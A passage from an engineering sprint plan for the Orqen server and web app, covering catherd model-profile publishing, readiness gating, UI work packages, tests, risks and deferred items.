       if hash(show_raw(name) minus "name") == v.doc_hash { goto FINAL } else { remove(name)? }
   create(name)?; base = show_raw(name) minus "name"; patch = patch_between(base, v.doc)
   for key in ORDER where patch has key: if set_key(..) == Refused(iss) { remove(name); return finish_failed("catherd_refused", iss) }
   val = validate(name)?; if val.errors non-empty { remove(name); return finish_failed("catherd_invalid", val.errors) }
   rb = show_raw(name) minus "name"; if sha256(canonical(rb)) != v.doc_hash { remove(name); return finish_failed("readback_mismatch", []) }
   FINAL: resolved = show_resolved(name)?; inv = list_profiles()?
   fenced txn: version {state:published, resolved, validation: val, published_at}; profile.latest_version_id = v (system field);
               catherd_states.inventory = inv; op succeeded {version_id, catherd_name}; event model_profile_version.published; complete
   finish_failed: fenced txn version {state:failed, failure}; op failed(problem code); event model_profile_version.failed; complete   (job succeeded, op failed)
   CatherdError with code catherd_unavailable/timeout => finish_failed (non-retryable result); LeaseLost => return immediately
   ```
   Invariant (doc comment): a `published` version always has a catherd profile whose raw content hash equals `doc_hash` at publish time. A catherd profile `o-*` exists only for a `published` or `publishing` version (the sweep enforces this). Orqen never makes a profile active or bound in catherd.
7. Rollback creates a version from `target.doc`/`meta` with `source{rollback, from}`, sets the draft to the same document, and uses the same job. The validation precondition is skipped because the job revalidates through catherd.
8. Diff: `diff.rs::diff(a,b) -> Vec<Change>` flattens with segment arrays and sorts by `path_display`.
9. Personal import job (`profile_import_personal`):
   - `rows = list_profiles(&PersonalCatherdEnv)`; the name must exist, else op failed `personal_profile_not_found`.
   - `raw = show_raw(&personal, name)` minus `name`.
   - Fenced txn: insert `model_profile{slug, name, draft.doc = raw, source{import_personal, ref: name}}`; event `model_profile.imported`.
   - **Never** calls create/set/remove with the personal env (enforced by types).
   - The new draft is unvalidated, so the user reviews, then validates and publishes into the org namespace.
10. Startup: for each org with `catherd_states`, enqueue nothing. The sweep runs lazily in publish and validate. Abandoned publishing versions are swept at request time and also at server start, with a one-shot `update_many` for `publishing` versions whose job is not active.

**Tests (fake, `model_profiles_test.rs`):**
- create, edit draft, validate (fake): valid
- publish gives `o-main-v1` in org A's fake home; the version doc is immutable
- edit, validate, publish gives v2; v1 is unchanged byte for byte
- diff draft vs latest shows the change paths
- rollback to v1 gives v3 with v1's doc
- publish without a fresh validation gives 409
- unknown field gives `unsupported_field`, which blocks publish
- `codex:gpt-6-sool#high` gives `rung_not_in_catalog` and no substitution
- reviewer on `opencode:opencode-go/gpt-6-luna#high` while the worker uses `codex:gpt-6-luna#high` gives `same_model`
- reviewer rung absent from the catalog gives `unknown`
- crash injection: `crash_after_sets(3)` makes the job fail with internal (retryable); the retry finds a half-built `o-main-v2` with a hash mismatch, removes it, rebuilds, ends published with exactly one catherd profile
- crash after the catherd profile completes but before the Mongo finalize (fake hook): the retry hits the hash-match branch and finalizes without recreating (fake call log shows no second `create`)
- two orgs with the same slug `main` get separate homes and distinct content, with cross-org 404
- binding stays on v1 after v2 is published (§19 "profile change during run" analogue)
- import-personal with the fake personal home: the draft equals the personal doc, and the fake records **zero** write calls against the personal env

**Tests (real, `#[ignore]`, `catherd_real_test.rs` additions):**
- (e) full publish of a doc (default plus reviewer rung change plus `budget.usd=5`) into a temp org home; `profile show o-main-v1 --raw --json` (run by the test) equals `doc` plus name
- (f) staging validation of a doc with `worker.enabled=false` returns an issue with path `roles.worker.enabled` and leaves no `s-*` profile
- (g) **personal hash test.** Create a temp "personal" home and seed it with real catherd `profile new mine --host codex` and `profile set --profile mine roles '{"worker":{"access":"read-only"}}'`. Compute a manifest (relative path → sha256, plus `lstat` type) of the whole personal home and the agents dir. Run Orqen import-personal (`ORQEN_PERSONAL_CATHERD_HOME=temp`), then validate, publish and bind. Recompute the manifest: it must be identical (no added, removed or changed files, including `config.json` and `projects.json`).
- (h) the real `~/.config/catherd` manifest is identical before and after the whole test file

**Accept:** `cargo test --test model_profiles_test`, plus the real ignored suite green.

### WP24: Profile binding, readiness gate, enable/disable automation, org health

**Files:** `projects/readiness.rs`, `projects/routes.rs`, `health.rs`, `tests/readiness_test.rs`.

**Readiness pseudo-code** (pure function over loaded inputs; loaders accept an optional session):
```
struct Inputs { project, conns: HashMap<ConnectionId, ConnectionDoc>, catalog_row: Option<CatalogProjectDoc>,
                bound: Option<(ModelProfileVersionDoc, Independence)>, catherd: CatherdStatus, cstate: Option<CatherdStateDoc> }
fn evaluate(i) -> Readiness {
  B = []; W = []
  let primary = repos.iter().find(primary)            else B+= primary_repo_missing(tab mapping)
  if primary: con = conns[primary.connection_id]; if !con.readiness.unattended_ready { B+= repo_connection_not_ready(reasons) }
              match catalog_row { None | Some(gone) => B+= repo_not_in_catalog, Some(archived) => B+= repo_archived }
              if target_branch empty => B+= target_branch_missing
  match jira { None => B+= jira_mapping_missing, Some(j) => { if !conns[j.connection_id].readiness.unattended_ready {B+= jira_connection_not_ready}
                                                       if j.board.is_none() && j.jql.trim().is_empty() {B+= jira_filter_missing} } }
  match mapping_check { None => B+= mapping_not_checked, Some(c) if c.mapping_hash != mapping_hash(project) => B+= mapping_check_stale,
                        Some(c) if c.results.any(failed) => B+= mapping_check_failed(checks) }
  if confluence refs non-empty => W+= confluence_refs_unverified
  if !commands.any(kind==test && approved) => B+= test_command_missing ; if commands.any(!approved) => B+= command_not_approved(keys)
  match (latest_contract, reviewed_contract) { (None,_) => B+= contract_not_imported, (Some(l), r) if r != Some(l) => B+= contract_not_reviewed }
  match bound { None => B+= profile_not_bound,
     Some((v, ind)) => { if v.state != published {B+= profile_version_not_published}
        let roles = v.doc.roles; if !enabled(reviewer) || !enabled(verifier) {B+= profile_not_automation_ready("reviewer_or_verifier_disabled")}
        if ind.status != independent {B+= profile_not_automation_ready(ind.status)}
        if v.doc.budget empty && !v.meta.budget_uncapped_ack {B+= profile_not_automation_ready("budget_not_chosen")}
        if cstate.inventory.map_or(true, |inv| !inv.names.contains(v.catherd_name)) {B+= bound_profile_missing_in_catherd} } }
  if !catherd.available || !catherd.supported {B+= catherd_unavailable}
  match cstate.last_doctor { None => B+= catherd_doctor_missing,
     Some(d) => { let used = backends_of(bound version rungs ∪ failover); fails = d.checks.filter(state==fail && (id=="config" || id.starts_with("profile") || used.any(|b| id==format!("backend:{b}"))));
                  if fails non-empty {B+= catherd_doctor_failing(ids)}; if d.checks.any(warn) {W+= doctor_warnings} } }
  state = if B.empty() { if enabled {Enabled} else {Ready} } else if enabled {EnabledBlocked} else {Draft}
}
```
`independence` is recomputed for the bound version against the **current** catalog snapshot (an unavailable model later means unknown, which blocks).

**Enable** (`with_txn` under `run_idempotent`):
- load the project with `revision==IfMatch` (else 409)
- load inputs with the session
- `evaluate`; blockers give `Err(ProjectNotReady{blockers})` (deterministic 4xx, so the replay is stored)
- `pol = policy::snapshot_resolved_in(s, org, prj)`
- `$set {automation_enabled:true, enabled_at, enabled_policy_version_id: pol, enabled_profile_version_id: bound}`, revision + 1
- event `project.automation_enabled {policy_version_id, profile_version_id}`

**Disable** clears the flag (keeps history in events).

**Binding PUT:** the version must be in the org and `published`; event `project.profile_bound`.

**Org health:** queue counts via `jobs.count_documents` scoped by org; connections list; catherd status; `runner.alive` from an `AtomicBool` heartbeat updated by the runner loop.

**Tests (`readiness_test.rs`, fakes end to end):**
1. Fresh project from catalog: blockers include all of the following (exact set asserted): `repo_connection_not_ready`?? not if the gitlab connection is verified; set up the gitlab connection verified first; `jira_mapping_missing, mapping_not_checked, test_command_missing, contract_not_imported, profile_not_bound, catherd_doctor_missing`.
2. Fix each step through the API (jira mapping, check, approve the test command from the contract suggestion, review the contract, publish and bind a profile, run doctor (fake ready)). Readiness becomes `ready`; enable gives 200 with `enabled_policy_version_id` set.
3. Change the mapping target branch: state `enabled_blocked` with `mapping_check_stale`. No stale green.
4. Disable the reviewer in a new version v2 and bind it: `profile_not_automation_ready`.
5. Enable with blockers gives 409 `project_not_ready`, and the same Idempotency-Key replays 409.
6. Remove the credential from the jira connection: `jira_connection_not_ready` (§19 "browser login without API credential").
7. §19 row 3: an unselected catalog project has no readiness endpoint (no project id) and the `jobs` collection contains only refresh jobs.

**Accept:** `cargo test --test readiness_test`, then `make check`.

### WP25 (web): shell, Projects list and Discover

**Files:**
- `router.tsx`, `components/sidebar-nav.tsx`
- `features/projects/{projects-page.tsx, discover-page.tsx, catalog-table.tsx, project-state-badge.tsx}`
- `api/hooks/{catalog.ts, projects.ts}`, `api/sse.ts`, `components/use-operation-runner.ts`
- `i18n/{en,fa}.json`, `components/ui/{checkbox,tabs,...}`
- tests `test/discover.test.tsx`

**Steps:** pages per §4. Selection state is a `Set<pid>` that persists across pages within the session and is cleared after a successful add. One idempotency key per "Add" intent, kept on retry. The table has `aria-label`s; checkboxes are keyboard-toggleable.

**Tests (vitest with mocked hooks):**
- select across 2 pages, then Add sends both pids once
- selected rows render the "Configured" badge
- empty and failed states render
- `fa` renders `dir=rtl` and paths inside `bdi[dir=ltr]`

**Accept:** `pnpm -C web lint typecheck check:rtl test --run build` (each as a separate script).

### WP26 (web): Project detail tabs (needs WP24 committed)

Readiness, mapping, commands, protected, contract, policy, profile, per §4. The command editor uses argv chips (each a separate input; no free-text command line). Contract file viewer shows LTR monospace text.

**Tests:**
- readiness blockers link to tabs
- the Enable button is disabled with the reason list
- the 409 `project_not_ready` toast lists blockers
- the conflict UI on mapping save
- an argv chip editor never joins argv into a string in the request payload (assert the fetch body)

**Accept:** same as WP25.

### WP27 (web): Models and catherd (catalog, profile editor, versions, diff, publish, rollback, import)

Per §4. The rung picker uses `GET /catherd/catalog?role=` and shows disabled items with `catalog.availability.*` text. Validate, Publish and Rollback use `useOperationRunner`. Publish is disabled unless `last_validation.draft_hash` equals the current draft hash (the server returns the `draft_hash` field in `ModelProfileDto`). Import-personal dialog: the list comes from `/catherd/personal-profiles`, with an explanatory note "A copy is made; your personal catherd settings are not changed".

**Tests:**
- a disabled rung cannot be added
- editing the draft marks the validation stale and disables Publish
- the diff sheet renders LTR paths
- the advanced JSON parse error blocks save
- the independence badge texts

**Accept:** same as WP25.

### WP28 (web): Policy editors and Health/Integrations

Org settings get a policy tab and the project policy tab, with an effective table and source badges (`policy.source.*` plus version number). Health page per §4. Connections page: `auth_username` field (shown for jira cloud and basic), identity/capabilities in the test panel, stage labels for the 4 adapter stages, `connStatus.verified`.

**Tests:**
- locked key shows a lock icon and has no edit control
- the source badge changes after a publish (mock)
- health catherd unavailable shows the degraded state

**Accept:** same as WP25.

### WP29 (web): Overview cards and polish

Overview cards for projects and catherd; nav enabled for `projects` and `models`; the a11y pass (labels, focus return as in Sprint 1). **Accept:** `make check`.

### WP30: Verification and docs (sequential, last)

1. `make check` green.
2. Real catherd: `ORQEN_TEST_CATHERD_BIN=$HOME/.bun/bin/catherd cargo test -p orqen-server --test catherd_real_test -- --ignored`.
3. Personal-hash guard: record `find ~/.config/catherd -type f -exec shasum {} + | sort | shasum`, `ls -la ~/.claude/agents` and `cat ~/.config/catherd/config.json | shasum` before and after steps 2 and 4. They must be identical.
4. Manual UI checklist (Browser pane, `ORQEN_CREDENTIAL_STORE=memory`, fake upstream started by a dev helper `cargo run --example fake_upstreams`, which prints the GitLab and Jira URLs; add `examples/fake_upstreams.rs` reusing the test fake module via `#[path]`). Items:
   - GitLab connection with custom port and `/gitlab` reaches Test `verified`
   - Discover shows 250 projects; search; select 2 across pages; add
   - Jira mapping via comboboxes
   - Check mapping
   - Import contract; AGENTS.md is shown but gives no suggestion; approve the pnpm test
   - Create profile; add rungs (disabled ones show reasons); validate with the **real** catherd; diff; publish; rollback
   - Bind; run doctor; readiness shows the precise remaining blockers (expected: `catherd_doctor_failing` if codex is not on the child PATH, otherwise ready); enable
   - fa/en, RTL, keyboard
5. Update `docs/DEVIATIONS.md` (Sprint 2 section) and `docs/VERIFICATION.md` (Sprint 2 table), README (new env vars and fake upstream example).

---

## 6. Definition of Done

| SPEC requirement | Shown by |
|---|---|
| §18 S2 "choose projects from a real list" | WP18 refresh of a paginated GitLab list (keyset and offset, 250 projects, custom port/path), WP25 checkbox discovery, WP19 from-catalog. With real accounts, the same code path runs against a real GitLab (user item). |
| §18 S2 "profile version/publish" | WP23 draft, validate (real catherd staging), diff, publish to immutable `o-{slug}-v{n}`, rollback as a new version, binding; crash and recovery tests; real-binary publish test (e) |
| §18 S2 "all fields without personal interference" | Every patchable 1.5.0 field is editable (WP27 tabs plus advanced); unknown fields visible but blocked (D58); per-org `CATHERD_HOME`/agents dir with `env_clear`; personal manifest tests (g) and (h); WP30 hash guard |
| §18 S2 health | WP17 real adapter stages, WP22 doctor/status, WP24 org health, WP28 page |
| §19 row 1: two orgs, same keys | Same pid and same profile slug across orgs give separate docs, catherd homes and catalogs, with cross-org 404s (WP18/19/23) |
| §19 row 2: custom port/path | Fake GitLab/Jira under `/gitlab`, `/jira` on random ports; request log asserts paths (WP17/18) |
| §19 row 3: discovered but not selected | No project doc and no jobs except refresh (WP18, WP24) |
| §19 "reviewer not different from coder" | `same_model` and `unknown` block automation (WP23/WP24) |
| §19 "unavailable model or wrong name" | `rung_not_in_catalog`, availability states, readback hash equality (no substitution) |
| §19 "profile change during run" (pre-run analogue) | Immutable versions; binding unchanged after a new publish; enable stores the version ids |
| §19 "import/edit catherd settings: personal hash and global binding unchanged" | Real tests (g) and (h); typed personal env with only read methods |
| §19 "browser login without API credential" | Connection readiness reasons; project blocker |
| §19 "task doc with policy/token instruction" | AGENTS.md fixture is stored as data, no suggestion, no approval |
| §19 "UI fa and English" | WP25–29 tests plus the WP30 checklist |
| §16 revision conflicts, idempotent operations | If-Match on every mutation; Idempotency-Key on all 202 operations and enable; dedupe tests |

## 7. Risks

1. **The catherd CLI write path is per-key and not atomic.** Mitigated: a fresh name per version, roles set last, refusal leads to removal, readback hash, orphan sweep. If catherd 1.6 changes the patch schema, the D61 version window blocks publish (truthful).
2. **Splitting `set` refusal messages is heuristic.** The fallback is a single issue. Authoritative structured errors come from `validate --json` when the save succeeds.
3. **doctor depends on the child PATH.** Under launchd, PATH is minimal: `ORQEN_CATHERD_PATH` must include Bun, codex and opencode. Readiness truthfully shows `catherd_doctor_failing`.
4. **doctor spawns `catherd mcp` once, which reconciles runs in the org home.** That is harmless in Sprint 2 (no runs). Revisit in Sprint 4: run doctor with the host's coordination, or accept it, since catherd designed doctor for this.
5. **Isolated harness needs backend API keys in catherd's env.** Orqen does not pass them yet, so catherd validation errors appear (correctly). Credential-scoped env injection is Sprint 4.
6. **Jira Server project listing is unpaginated upstream.** Large instances are filtered in memory with a 5000-project cap and warning `truncated`.
7. **GitLab `simple=true` omits access level.** Push permission is checked in Sprint 4 (Publisher).
8. **Contract import reads only well-known root files.** Monorepo nested manifests are covered only through `package_path`.
9. **The catalog snapshot is 436 KB per refresh.** It is a content-addressed artifact; orphan GC is still deferred.
10. **Catalog changes after publish** can turn a bound version's independence to `unknown` (blocks). This is intentional, and is surfaced with a clear reason.

## 8. Needs the user, and deferred work

**Needs the user:**
- Real GitLab and Jira base URLs plus tokens (GitLab PAT with `read_api`, or `api` for the Sprint 4 publisher; Jira Cloud email plus API token, or a DC PAT) to run the WP30 checklist against real services. Everything else is verified with fakes.
- Confirmation that `membership=true` is the right discovery scope. An admin might prefer all visible projects; this could be a connection option later.
- Approval that Orqen runs the real `catherd doctor` in its own per-org home. It spawns one `catherd mcp` handshake and sandbox, network and docker probes; no model calls.
- A decision on the Jev and Artificial Analysis keys for org namespaces. Not handled in Sprint 2: doctor shows `jev no key`.
- Confirmation that the fixed orchestration host is `codex` (D59).

**Deferred to Sprint 3+:**
- RMCP connectors (gitlab-mcp, mcp-atlassian) behind the same traits
- the Confluence and Figma adapters and Confluence ref verification
- run-level policy overrides and run pinning (Sprint 3)
- catherd repo binding and per-run profile pin at run start, credential-backed command env, protected-path enforcement, push-permission check (Sprint 4)
- Setup wizard page
- org template export/import
- profile export
- catherd `treat-like` editing from the UI
- Jev integration
- orphan artifact GC
- Playwright e2e

### Critical files for implementation
- crates/orqen-server/src/connections/probe.rs
- crates/orqen-server/src/idempotency/service.rs
- crates/orqen-server/src/db/scoped.rs
- crates/orqen-server/tests/common/mod.rs and crates/orqen-server/tests/common/fake_upstream.rs
- /Users/you/node_modules/catherd-cli/src/domain/profile.ts (the patch schema to mirror) and /Users/you/node_modules/catherd-cli/src/entry/profile-command.ts (exact CLI semantics)
- web/src/api/hooks/connections.ts and web/src/api/sse.ts (frontend patterns to extend)